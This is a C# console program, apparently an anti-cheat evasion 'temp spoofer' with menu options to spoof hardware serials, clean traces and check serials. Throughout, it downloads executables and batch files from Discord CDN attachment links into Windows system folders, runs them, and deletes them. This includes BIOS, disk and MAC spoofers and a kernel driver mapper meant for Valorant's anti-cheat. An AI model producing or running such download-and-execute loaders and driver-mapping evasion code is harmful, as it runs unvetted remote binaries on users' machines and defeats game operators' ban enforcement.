using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Net;
using System.Diagnostics;
using System.Security.Principal;
namespace Spoofer_menu_test
{
    class Print
    {
        //CLEANER IS UPDATED - 1/19/2023
        private static string SIDCleaner = WindowsIdentity.GetCurrent().User.Value;

        public static void Cleantraces()
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.RedirectStandardInput = false;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = false;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = false;
            process.Start();
            CleanTraces2();
        }
        public static void CleanTraces2()
        {
            using (System.Diagnostics.Process proc = new System.Diagnostics.Process())
            {
                WebClient web = new WebClient();
                string valcleaner34 = @"C:\Windows\valcleaner34.bat";
                string registry = @"C:\Windows\Registry.bat";
                string registry2 = @"C:\Windows\Registry2.bat";
                string fncleaner34 = @"C:\Windows\fncleaner34";
                web.DownloadFile("https://cdn.discordapp.com/attachments/1046596934493814884/1065659417309225090/cleaner34.exe", fncleaner34);
                web.DownloadFile("https://cdn.discordapp.com/attachments/1046596934493814884/1065769115349954630/cleaner34.bat", valcleaner34);
                web.DownloadFile("https://cdn.discordapp.com/attachments/1062145715322769481/1065774756957266020/Registry.bat", registry);
                web.DownloadFile("https://cdn.discordapp.com/attachments/1062145715322769481/1065774757263462522/Registry2.bat", registry2);
                proc.StartInfo.UseShellExecute = false;
                Process.Start(valcleaner34);
                Process.Start(fncleaner34);
                Process.Start(registry);
                Process.Start(registry2);
                Thread.Sleep(2000);
                File.Delete(valcleaner34);
                Process.Start(fncleaner34);
                File.Delete(registry);
                File.Delete(registry2);
                Thread.Sleep(2000);
            }
        }
        static public void Clean()
        {
            Thread.Sleep(1000);
            Console.Clear();

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("Cleaning...");

            Thread.Sleep(1000);
            CleanTraces2();
            Thread.Sleep(5000);

            Console.Clear();
            Console.WriteLine("Done Cleaning Your Computer");
        }
        static public void prints()
        {
            /*colour list
                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.ForegroundColor = ConsoleColor.Blue;
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.ForegroundColor = ConsoleColor.Red;
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.ForegroundColor = ConsoleColor.Blue;
                Console.ForegroundColor = ConsoleColor.Gray;
            
                */
            //Remove colour Console.ResetColor();

            Thread.Sleep(1000);
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("AKM'S");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(" Temp");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write(" Spoofer");
            Console.WriteLine("");
            Console.WriteLine("");
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("1");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("]");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(" Spoof ");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("1");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("]");
            Console.WriteLine("");
            Console.WriteLine("");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("2");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("]");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(" Clean ");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("2");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("]");
            Console.WriteLine("");
            Console.WriteLine("");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("3");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("]");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(" Serials ");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("3");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("]");
            Console.WriteLine("");
            Console.WriteLine("");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("4");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("]");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(" Exit ");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("4");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("]");
            Console.WriteLine(" ");
            Console.WriteLine(" ");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("!");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("]");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(" Option: ");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("!");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("]");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(" ");
            Console.WriteLine(" ");
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write("--> ");

        }


    }
    class Program
    {
        static void Main(string[] args)
        {
            WebClient web = new WebClient();
            Process process = new Process();


            Thread.Sleep(1000);
            Print.prints();

            var menu = Console.ReadLine();

            if (menu == "1")
            {
                Console.Clear();
                Thread.Sleep(2000);

                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("[+] Randomize Serial Spoofing");
                Thread.Sleep(692);
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("[+] Null Spoofing");
                Thread.Sleep(630);
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("[+] Motherboard Spoofing");
                Thread.Sleep(130);
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("[+] SMIBIOS Spoofing");

                //BIOS Spoofer
                string Bios = @"C:\Windows\IME\Bios.exe";
                web.DownloadFile("https://cdn.discordapp.com/attachments/1053795294707449958/1066085492648583228/User.exe", Bios);
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = false;
                process = Process.Start(Bios);
                process.WaitForExit();
                File.Delete(Bios);
                Thread.Sleep(13000);

                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("[+] GUID Spoofing");
                Thread.Sleep(630);

                //GUID Spoofer (BROKEN!)
                //string GUID = @"C:\Windows\IME\guid.exe";//
                //web.DownloadFile("https://cdn.discordapp.com/attachments/1062400021615616011/1065857658025943040/Guid_Spoofer.exe", GUID);//
                //process.StartInfo.UseShellExecute = false;//
                //process.StartInfo.CreateNoWindow = false;//
                //process = Process.Start(GUID);//
                //File.Delete(GUID);//
                //Thread.Sleep(22000);//

                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("[+] Disk Spoofing");
                Thread.Sleep(2000);

                //Disk spoofer
                string Disk = @"C:\Windows\IME\disk.exe";
                web.DownloadFile("https://cdn.discordapp.com/attachments/974370340681703434/974373853692313680/HardDiskVolumeIDChanger.exe", Disk);
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = false;
                process = Process.Start(Disk);
                process.WaitForExit();
                File.Delete(Disk);
                Thread.Sleep(11000);

                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("[+] CPU Spoofing");
                Thread.Sleep(200);

                //Disk spoofer
                string asf = @"C:\Windows\IME\asf.bat";
                web.DownloadFile("https://cdn.discordapp.com/attachments/1053795294707449958/1066086735735435264/asf.bat", asf);
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process = Process.Start(asf);
                process.WaitForExit();
                File.Delete(asf);
                Thread.Sleep(5000);

                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("[+] GPU Spoofing");
                Thread.Sleep(630);
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("[+] Mac Spoofing");
                Thread.Sleep(2000);

                //Mac spoofer
                string Mac = @"C:\Windows\IME\mac.bat";
                web.DownloadFile("https://cdn.discordapp.com/attachments/1053795294707449958/1066085625335382179/mac.bat", Mac);
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = false;
                process = Process.Start(Mac);
                process.WaitForExit();
                Thread.Sleep(5000);
                File.Delete(Mac);
                Thread.Sleep(2000);

                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("[+] Custom Serial Spoofing");
                Thread.Sleep(1030);

                // Main spoofer driver load.
                Thread.Sleep(1000);
                // Public drivers (i think there semi-ud, i got no clue)
                string map = @"C:\Windows\IME\vanguardmapper.exe";
                string sys = @"C:\Windows\IME\valorant.sys";
                string load = @"C:\Windows\IME\Loader.bat";
                web.DownloadFile(" DRIVER NAME HERE", sys);
                web.DownloadFile(" MAPPER LINK HERE ", map);
                web.DownloadFile("https://cdn.discordapp.com/attachments/1053795294707449958/1065704577762087014/driverLoader.bat", load);
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.UseShellExecute = true;
                process.StartInfo.CreateNoWindow = false;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
                process = Process.Start(load);
                Thread.Sleep(1000);
                process.Close();
                File.Delete(sys);
                File.Delete(map);
                File.Delete(load);
                Thread.Sleep(2000);

                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Operation Completed successfully");
                Thread.Sleep(100);
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Operation Completed successfully");
                Thread.Sleep(100);
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Operation Completed successfully");
                Thread.Sleep(100);
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Operation Completed successfully");
                Thread.Sleep(100);
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Operation Completed successfully");
                Thread.Sleep(100);
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Operation Completed successfully");
                Thread.Sleep(100);
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Operation Completed successfully");
                Thread.Sleep(100);
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Operation Completed successfully");
                Thread.Sleep(100);
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Operation Completed successfully");
                Thread.Sleep(100);
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Operation Completed successfully");
                Thread.Sleep(100);
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Operation Completed successfully");
                Thread.Sleep(100);
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Operation Completed successfully");
                Thread.Sleep(100);
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Operation Completed successfully");
                Thread.Sleep(100);

                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(" ");
                Console.WriteLine("Spoofed successfully");
                Environment.Exit(0);
                Thread.Sleep(3000);

                Print.prints();
            }
            else
            {
                Print.prints();
            }
            if (menu == "2")
            {

                Console.Clear();
                Thread.Sleep(1000);

                Print.Clean();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Cleaned successfully");

                Print.prints();
            }
            else
            {
                Print.prints();
            }

            if (menu == "3")
            {
                Console.Clear();
                string checker = @"C:\Windows\IME\checker.bat";
                web.DownloadFile("https://cdn.discordapp.com/attachments/1046596934493814884/1065673904317812736/checker.bat", checker);
                process.StartInfo.UseShellExecute = false;
                process = Process.Start(checker); 
                process.WaitForExit();
                Thread.Sleep(500);
                File.Delete(checker);
                Thread.Sleep(500);

            }
          if (menu == "4")
            {
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine("Exiting...");
                Thread.Sleep(1000);
                Environment.Exit(0);
            }
        }
    }
}
